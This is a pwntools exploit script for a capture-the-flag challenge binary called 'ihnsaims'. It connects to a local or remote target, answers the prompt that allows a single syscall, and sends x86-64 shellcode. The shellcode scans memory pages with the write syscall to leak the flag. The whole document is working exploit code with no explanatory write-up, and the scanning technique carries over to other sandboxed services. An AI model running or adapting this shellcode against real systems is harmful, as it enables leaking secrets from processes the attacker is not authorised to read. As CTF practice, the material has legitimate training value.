#!/usr/bin/env python
from pwn import *
from time import sleep

context.binary = e = ELF("ihnsaims")

gs = """
brva 0x015FA
"""


def start():
    if args.LOCAL:
        p = e.process(["flag{testlocalaaaaaaaa}"])
        if args.GDB:
            gdb.attach(p, gdbscript=gs)
            pause()
    elif args.REMOTE:  # python x.py REMOTE <host> <port>
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p


shellcode = asm(
    """
            mov rcx, 0x100000000
            xor r9, r9
            loop:
                mov edi, 1
                mov eax, 1
                lea rsi, [r9+0x4200000]
                mov edx, 0x1000
                syscall
                cmp eax, 0
                jg done
                add r9, 0x1000
                cmp r9, rcx
                jne loop
            done:
                ret

        """
)

p = start()

p.sendafter(b"I'm feeling generous this CTF, so I'll give you 1 whole syscall that you'll be allowed to use! Go ahead, pick a number!\n", b'1')

p.sendafter(
    b"Ok lets skip all that 'exploitation' business for this one - give me some shellcode to execute!\n",
    shellcode
)


p.interactive()
